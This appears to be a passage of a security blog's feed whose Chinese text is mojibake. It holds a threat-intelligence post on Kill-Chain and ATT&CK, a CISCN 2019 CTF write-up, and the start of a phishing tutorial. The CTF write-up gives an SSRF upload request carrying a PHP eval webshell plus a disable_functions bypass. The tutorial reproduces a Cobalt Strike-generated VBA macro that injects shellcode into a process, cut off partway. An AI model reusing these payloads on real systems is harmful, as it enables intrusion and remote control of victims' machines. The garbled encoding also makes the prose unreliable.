‡ã€‚</p><h3 id="Kill-Chain-Diamond-Model"><a href="#Kill-Chain-Diamond-Model" class="headerlink" title="Kill-Chain + Diamond Model"></a>Kill-Chain + Diamond Model</h3><p>ç›´æ¥ä¸¾ä¸ªä¾‹å­<code>@e1knot</code>å¸ˆå‚…ç»™çš„ä¾‹å­ï¼š</p><p>å¤æ‚çš„æ”»å‡»å¾€å¾€éƒ½æ˜¯æœ‰ä¸€ç³»åˆ—çš„æ”»å‡»äº‹ä»¶ç»„æˆçš„ï¼Œä¸åŒçš„æ”»å‡»äº‹ä»¶æŒ‡å‘çš„ç›®æ ‡å’Œè¾¾åˆ°çš„ç›®çš„å¯ä»¥è¡¨ç¤ºå‡ºæ”»å‡»çš„è¿›ç¨‹ï¼Œé‚£ä¹ˆOKï¼Œæˆ‘ä»¬å¦‚æœæŠŠäº‹ä»¶æŒ‰ç…§Kill-Chainè¿›è¡Œåˆ†ç±»åŒæ—¶ä½¿ç”¨æ³³é“å›¾è¿›è¡Œè¡¨ç¤ºï¼ŒåŒæ—¶æŠŠä¸åŒçš„æ”»å‡»è·¯çº¿åˆ†ä¸ºä¸åŒçš„æ”»å‡»çº¿ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªè¿™æ ·çš„æ³³é“å›¾ã€‚<br><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/84FF0AAE-65B8-43D4-8BB2-F5E6A1E8A614.jpg" alt="b9baf610a02307c8c0c3d905bc9b497c.jpeg"><br>å…¶å®è¿™å¼ å›¾æè¿°çš„æ˜¯è¿™ä¹ˆä¸€ä¸ªäº‹ä»¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.æ”»å‡»è€…å…ˆå¯¹ç›®æ ‡è¿›è¡Œäº†Google Hackingæ“ä½œï¼Œè·å¾—äº†ä»–ä»¬åŸŸåè§£æè®°å½•ç­‰ä¸€äº›åŸºç¡€çš„Itä¿¡æ¯</span><br><span class="line">2.æ”»å‡»è€…æ‰¾åˆ°äº†ä¸€ä¸ªç›®æ ‡æ–°æ³¨å†Œçš„åŸŸåï¼Œç„¶åç”¨æœç´¢å¼•æ“æœç´¢ä»–ä»¬çš„ç½‘ç»œç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶ä¿¡æ¯</span><br><span class="line">3.æ”»å‡»è€…ä½¿ç”¨é±¼å‰é‚®ä»¶æ–¹å¼å¯¹ç›®æ ‡çš„ç½‘ç»œç®¡ç†å‘˜å‘é€ä¸€å°å¸¦æœ‰æœ¨é©¬çš„é‚®ä»¶</span><br><span class="line">4.ç›®æ ‡çš„ç½‘ç®¡ï¼ˆæˆ‘ä»¬å«ä»–ç½‘ç®¡ä¸€å·ï¼‰æ‰“å¼€äº†è¿™å°é‚®ä»¶çš„é™„ä»¶ç„¶åä¸å¹¸ä¸­æª</span><br><span class="line">5.ç½‘ç®¡ä¸€å·çš„ä¸»æœºå› ä¸ºä¸­äº†ç—…æ¯’ï¼Œæ‰€ä»¥æ”»å‡»è€…åˆ©ç”¨ç½‘ç®¡ä¸€å·è¿™å°ä¸»æœºå‘é€äº†ä¸€ä¸ªHTTP Postè¯·æ±‚åˆ°åŸŸæ§èŠ‚ç‚¹ï¼Œç„¶ååŸŸæ§èŠ‚ç‚¹è¿”å›äº†ä¸€ä¸ªHTTP Response</span><br><span class="line">6.æˆ‘ä»¬é€šè¿‡å¯¹é±¼å‰é‚®ä»¶ä¸­é™„ä»¶è¿›è¡Œé€†å‘åˆ†æå‘ç°é‡Œé¢æœ‰ä¸¤ä¸ªIPåœ°å€ï¼Œç¬¬äºŒä¸ªIPåœ°å€ä½œä¸ºå¤‡ä»½ï¼Œé˜²æ­¢ç¬¬ä¸€ä¸ªå¤±æ•ˆ</span><br><span class="line">7.é€šè¿‡C&amp;Cè¯·æ±‚åˆ°ç½‘ç®¡ä¸€å·çš„ä¸»æœºï¼Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªTCPä»£ç†æœåŠ¡</span><br><span class="line">8.é€šè¿‡ç½‘ç®¡ä¸€å·ä¸»æœºä¸Šçš„ä»£ç†æœåŠ¡ï¼Œæ”»å‡»è€…ç»§ç»­å»Googleä¸Šæœç´¢å…¶ä»–çš„ç›®æ ‡</span><br><span class="line">9.æ”»å‡»è€…æ£€æŸ¥ç½‘ç®¡ä¸€å·é‚®ä»¶çš„é€šä¿¡å½•åˆ—è¡¨å»å¯»æ‰¾æ˜¯å¦æ‹¥æœ‰ç›®æ ‡äºŒå·çš„é€šè®¯æ–¹å¼ï¼Œç»“æœå‘ç°äº†ç›®æ ‡äºŒå·çš„é¦–å¸­ç§‘å­¦å®¶çš„è”ç³»æ–¹å¼</span><br><span class="line">10.æ”»å‡»è€…ä½¿ç”¨æ”»é™·çš„ç½‘ç®¡ä¸€å·çš„é‚®ç®±å¯¹ç›®æ ‡äºŒå·çš„é¦–å¸­ç§‘å­¦å®¶çš„é‚®ç®±å‘èµ·é±¼å‰é‚®ä»¶æ”»å‡»ï¼Œå·¥å…·ä½¿ç”¨å’Œä¹‹å‰ä¸€æ ·çš„</span><br><span class="line">11.æ­¤æ—¶åˆæ¥äº†ä¸€ä¸ªæ”»å‡»è€…ï¼Œæˆ‘ä»¬ç§°ä»–ä¸ºæ”»å‡»è€…äºŒå·ï¼Œæ”»å‡»è€…ä¸€å·æ‰«æäº†ç›®æ ‡ä¸‰å·çš„webæœåŠ¡å™¨</span><br><span class="line">12.ä½¿ç”¨åŒæ ·çš„æ¼æ´åˆ©ç”¨å·¥å…·æ”»å‡»å‘ç°ç›®æ ‡ä¸‰å·ä¸»æœºä¸Šçš„ç›¸åŒçš„æ¼æ´</span><br><span class="line">13.è¢«æ”»é™·çš„ç›®æ ‡ä¸‰å·ä¸»æœºè¿”å›ä¸€ä¸ªshellä¼šè¯ç»™æ”»å‡»è€…ä¸‰å·</span><br><span class="line">14.ç›®æ ‡ä¸‰å·çš„æ‰€æœ‰æ•°æ®è¢«æ”»å‡»è€…ä¸‰å·çªƒå–</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·çš„è¯ä½¿ç”¨Kill-Chainå’Œé’»çŸ³æ¨¡å‹åˆ†æå¯ä»¥åŒæ—¶getåˆ°æ”»å‡»è€…çš„ç‚¹å’Œæƒ³è¦æ”»å‡»çš„ç›®æ ‡ï¼ŒåŒæ—¶è¿˜çŸ¥é“äº†ä»–çš„æ”»å‡»è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ—¶å€™æˆ‘ä»¬å¯¹æ”»å‡»è€…äº†å¦‚æŒ‡æŒäº†ã€‚</p><h3 id="ATT-amp-CK-Matrix-for-Enterprise"><a href="#ATT-amp-CK-Matrix-for-Enterprise" class="headerlink" title="ATT&amp;CK Matrix for Enterprise"></a>ATT&amp;CK Matrix for Enterprise</h3><p>è¿™ä¸ªæ˜¯æˆ‘è‡ªå·±åŠ ä¸Šå»çš„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¹³æ—¶å»äº†è§£çº¢é˜ŸTTPçš„å¥½åœ°æ–¹<br><img src="/åˆè¯†å¨èƒæƒ…æŠ¥.resources/1223BE32-9B48-4504-8164-6F1625D130B3.png" alt="2425d00398a387cd6532219f91303fa9"></p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>å­¦ä¹ ä¸Šé¢çš„çŸ¥è¯†ä¹Ÿæœ‰ä¸€ç‚¹è‡ªå·±çš„æƒ³æ³•ï¼Œå¨èƒæƒ…æŠ¥ä½œä¸ºæ€åŠ¿æ„ŸçŸ¥çš„ä¸€ç§ï¼Œä¸ä»…èƒ½å¤Ÿè®©ä¼ä¸šé’ˆå¯¹æ€§çš„è¿›è¡Œé˜²å¾¡ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤Ÿè®©è¿è¥çœ‹åˆ°è‡ªå·±çš„ä¸€äº›ç›²ç‚¹ï¼Œèƒ½å¤Ÿè·Ÿå¥½çš„è¿›è¡Œä¼ä¸šå®‰å…¨å»ºè®¾ç›¸å…³çš„æ–¹é¢ï¼ˆè¯´åˆ°è¿™é‡Œä¹Ÿä¸å¾—ä¸èµå¹è°·æ­Œçš„0ä¿¡ä»»ï¼ŒçœŸçš„å¤ªç‰›é€¼äº†)ï¼Œå¨èƒæƒ…æŠ¥èƒ½åšçš„äº‹æƒ…è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œæˆ‘è‡ªå·±æ•´ç†ä¹‹åè§‰å¾—æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹å‘ï¼š</p><pre><code>1. ä¼ä¸šå®‰å…¨å»ºè®¾ç›¸å…³2. å­¦ä¹ è¿è¥ç›²ç‚¹3. æº¯æºæ”»å‡»4. å…¨çƒå…±äº«æƒ…æŠ¥ï¼Œå¢åŠ å…¥ä¾µæˆæœ¬5. å­¦ä¹ æ–°çš„æ”»å‡»æ‰‹æ®µï¼Œæ”¶é›†0dayï¼ˆèœœç½ï¼‰6. â€¦â€¦</code></pre><p>æœ€åï¼Œe1knotå¸ˆå‚…tql</p><h2 id="0x04-é“¾æ¥"><a href="#0x04-é“¾æ¥" class="headerlink" title="0x04 é“¾æ¥"></a>0x04 é“¾æ¥</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484237&amp;idx=1&amp;sn=a02b4576bac88de4089a259d3da3ccb9&amp;chksm=ec6fe44ddb186d5b57eb61af95a7edbf24d4012fa640a9382e2e99f236f0215f2b3953658297&amp;scene=38#wechat_redirect" target="_blank" rel="noopener">ä½¿ç”¨å¨èƒæƒ…æŠ¥è°ƒæŸ¥æ”»å‡»è€…</a></p><p><a href="https://zhuanlan.zhihu.com/p/30160133" target="_blank" rel="noopener">ä½¿ç”¨å¨èƒæƒ…æŠ¥è¿½è¸ªæ”»å‡»è€…â€”â€”Part 2 é«˜çº§å¨èƒäº‹ä»¶åˆ†æä¸é˜²å¾¡çŸ©é˜µ</a></p><p><a href="https://www.xmanblog.net/threat-intelligence/" target="_blank" rel="noopener">æµ…æå¨èƒæƒ…æŠ¥</a><br><a href="https://xz.aliyun.com/t/1814" target="_blank" rel="noopener">æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸Šï¼‰â€”æ”»å‡»è€…æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿</a><br><a href="https://xz.aliyun.com/t/1928" target="_blank" rel="noopener">æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸­ï¼‰â€”åŸºç¡€è®¾æ–½æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿</a><br><a href="https://xz.aliyun.com/t/1935" target="_blank" rel="noopener">æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸‹ï¼‰â€”äº‹ä»¶æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-14 23:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30679]SCENT-65089776.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
      <category term="Threat Intelligence" scheme="http://patrilic.top/categories/Threat-Intelligence/"/>
    
    
      <category term="å¨èƒæƒ…æŠ¥" scheme="http://patrilic.top/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11 èµ›åå¤ç›˜</title>
    <link href="http://patrilic.top/2019/07/28/CISCN%202019%20Final%20Web11/"/>
    <id>http://patrilic.top/2019/07/28/CISCN 2019 Final Web11/</id>
    <published>2019-07-28T07:08:02.000Z</published>
    <updated>2019-08-20T15:26:59.716Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[41576]ã€Œã€€ã­ã‡ã€ã€-64710934.jpg" alt><br>æ¯”èµ›çš„æ—¶å€™ç†¬äº†ä¸€ä¸‡å¹´ï¼Œåªçœ‹åˆ°äº†ä¸€ä¸ªæœ¬åœ°è¯·æ±‚ï¼Œéƒ½ä¸çŸ¥é“è¿™ä¸ªssrfæ€ä¹ˆåˆ©ç”¨ï¼Œå“ï¼Œè¿˜æ˜¯è¦å¥½å¥½å­¦é€†å‘(åè¡€)</p></blockquote><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a> (æ¨ä¸€æ‰‹åŒ—è”åˆå¸ˆå‚…çš„å¹³å°)<br>é¢˜ç›®æºç ï¼š<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><p>ä¸Šä¼ æ–‡ä»¶æ˜¾ç¤ºåªèƒ½localhostä¸Šä¼ ï¼Œå¹¶ä¸”ä½¿ç”¨$SERVER[â€˜Remote-addrâ€™]æ¥è·å–ip<br>æ„Ÿè§‰åªèƒ½é‡‡ç”¨ssrfä¹‹ç±»çš„æ–¹å¼å»ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸€ç›´æ²¡getåˆ°ç‚¹</p><p><a href="http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md" target="_blank" rel="noopener">http://web65.buuoj.cn/index.php?act=post&amp;md=readme.md</a><br>mdå‚æ•°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥åˆ©ç”¨phpä¼ªåè®®è¯»æºç <br><img src="/CISCN 2019 Final Web11.resources/D3CBF586-E936-4124-93C5-A89366265174.png" alt="7d9e6b80be391556be25e272dcb649f8"></p><p>ç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ä¸€ç›´å¡åœ¨è¿™é‡Œã€‚<br>ä¸€ç›´åœ¨æƒ³æ€ä¹ˆå»ç»•è¿‡ï¼Œç„¶åæ¯”èµ›ç»™äº†æç¤ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. SSRF</span><br><span class="line">2. .htaccess</span><br></pre></td></tr></table></figure></p><p>.htaccesså¯ä»¥çœ‹åˆ°ä»–è®©.mdæ ¼å¼è§£ææˆäº†php<br><img src="/CISCN 2019 Final Web11.resources/7D9338F3-6F65-468B-9691-352B58498516.png" alt="25da9c8a3e1d8a088353b5d55747884a"></p><p>ä½†æ˜¯ssrfåˆæ€ä¹ˆå»çœ‹å‘¢ï¼Œæºç é‡Œè‚¯å®šæ²¡æœ‰ï¼Œé—®é¢˜åº”è¯¥å‡ºåœ¨.soæ–‡ä»¶é‡Œ<br>post.phpé‡Œè°ƒç”¨äº† <strong>pmark_include()</strong> å‡½æ•°<br><img src="/CISCN 2019 Final Web11.resources/58BBF5BD-2025-44D1-971A-B1F7AFADA63E.png" alt="7f5b593808f423764660307f15744e2a"></p><p>è€Œåœ¨readme.mdé‡Œæ˜¯èƒ½æŠŠsoæ–‡ä»¶ä¸‹ä¸‹æ¥çš„<br>æ‰“å¼€IDAåˆ†æä¸€æ³¢</p><p>sub_1850é‡Œå­˜åœ¨ä¸€ä¸ªHttpåŒ…ï¼Œä¼šä»¥127.0.0.1çš„èº«ä»½å»request<br><img src="/CISCN 2019 Final Web11.resources/3472965F-EB2A-4FBC-9ACF-6D3D2D6DFB49.png" alt="0bb9f4775d2531e018e23f72e2803950"></p><p>å¾€ä¸Šæ‰¾è°ƒç”¨<br><img src="/CISCN 2019 Final Web11.resources/96DC7631-995E-46AB-B7FF-157D53503E90.png" alt="53e4cf1d179c5eb62ff8d33bc810f35d"><br><img src="/CISCN 2019 Final Web11.resources/3A9A08B0-404E-4783-BE8A-AFF0428FB826.png" alt="361977c811b801c48c5a73dd4e2c51a8"><br><img src="/CISCN 2019 Final Web11.resources/7774A215-1CC3-4998-AAA6-552A05DD86E4.png" alt="33f0b7885e41503a3a65a1ec8ddb08f2"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int zend_hash_find ( HashTable* ht, char* arKey, uint nKeyLength, void** pData )</span><br></pre></td></tr></table></figure></p><p>v15: debug</p><p>å‚æ•°ä¸ºdebug,åˆ©ç”¨ssrfä¸Šä¼ å³å¯</p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Referer: http://127.0.0.1:8080/index.php?act=upload</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797</span><br><span class="line">Content-Length: 244</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">eval($_REQUEST[a]);</span><br><span class="line"></span><br><span class="line">-----------------------------6693638881479522630623693797--</span><br></pre></td></tr></table></figure></p><p>åˆ©ç”¨popen()ç»•è¿‡disabled_function<br><img src="/CISCN 2019 Final Web11.resources/94B8FADA-439F-4570-AFFB-44DF3A46FF86.png" alt="6107013d4772477cccc8e3fa7092f23b"></p><p><img src="/CISCN 2019 Final Web11.resources/F8097A0E-B573-4829-845E-0430F080DEB4.png" alt="ae389cb740da2a425e80d4d3a9b8d851"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-07-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[41576]ã€Œã€€ã­ã‡ã€ã€-64710934.jpg&quot; alt&gt;&lt;br&gt;æ¯”èµ›çš„æ—¶å€™ç†¬äº†ä¸€ä¸‡å¹´ï¼Œåªçœ‹åˆ°äº†ä¸€
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Phishing Attack - æ–‡ä»¶è½åœ°</title>
    <link href="http://patrilic.top/2019/07/18/Phishing%20Attack%20-%20%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0/"/>
    <id>http://patrilic.top/2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/</id>
    <published>2019-07-18T03:20:33.000Z</published>
    <updated>2019-08-20T15:27:23.041Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-07-18 11:20:33<br><img src="/wallpaper/[39567]Good Morning-54191467.png" alt><br>[toc]<br>é±¼å‰æ”»å‡»ï¼Œä½œä¸ºä¸€ç§å¸¸è§çš„æ”»å‡»å½¢å¼ï¼Œä¸­å¿ƒæ€æƒ³å°±æ˜¯å°†shellcodeä»¥å„ç§å½¢å¼è¿›è¡Œä¼ªè£…ï¼Œç„¶åè¯±ä½¿å—å®³è€…å¯åŠ¨ç¨‹åºï¼Œåˆ©ç”¨C2æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>é±¼å‰æ”»å‡»çš„éš¾ç‚¹ï¼š</p><ol><li>ä¿¡ä»»ä¼ªé€  â€“ å¸¸è§çš„æœ‰swaksä¼ªé€ é‚®ä»¶ï¼ŒDNSåŠ«æŒï¼Œæ”¹å†™è¢«ä¿¡ä»»ç½‘ç«™ç­‰</li><li>å…æ€ â€“ èƒ½è§„é¿å¸‚é¢ä¸Šå¤§å¤šæ•°æ€æ¯’è½¯ä»¶ï¼Œä¸è¢«å‘ç°</li><li>ç»´æŒè¿›ç¨‹ â€“ é•¿æœŸæ§åˆ¶ï¼Œï¼Œå¼€æœºè‡ªå¯</li><li>ä¸æš´éœ² â€“ ä¸è½åœ°ï¼Œä¾é™„è¿›ç¨‹ï¼Œcertutilç­‰</li></ol><p>æœ¬æ–‡æ„åœ¨æ€»ç»“ä¸€äº›è¾ƒä¸ºå¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸æ˜¯å¾ˆæ³¨é‡æ–‡ç¬”ï¼Œçœ‹çœ‹å°±å¥½ï¼Œä¸€äº›è„šæœ¬æ˜¯ç›´æ¥copyå¤§æ‰‹å­<code>@3gstudent</code>å¸ˆå‚…çš„ï¼Œç„¶åå…³äºç±»ä¼¼ä¸<code>CobaltStrike</code>çš„Spear phishä»¥åŠNginxçš„ç©æ³•ï¼Œå•ç‹¬è¿›è¡Œæ€»ç»“</p><h2 id="0x00-Office"><a href="#0x00-Office" class="headerlink" title="0x00 Office"></a>0x00 Office</h2><h3 id="Office-Macro"><a href="#Office-Macro" class="headerlink" title="Office Macro"></a>Office Macro</h3><p>Officeæ–‡æ¡£å†…ç½®å®ï¼Œå¯åˆ©ç”¨VBè¿œç¨‹å‘½ä»¤æ‰§è¡Œå›å¼¹åˆ°C2æœåŠ¡å™¨<br>ğŸ‘‡ç”±CobaltStrikeç”Ÿæˆçš„Macroç—…æ¯’æ ·æœ¬<br><img src="/Phishing Attack - æ–‡ä»¶è½åœ°.resources/6A9FD69F-ED50-4060-93AA-726501F481E2.png" alt="0ea9ced974025abd297e31f79a2624bb"></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> LongPtr, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> 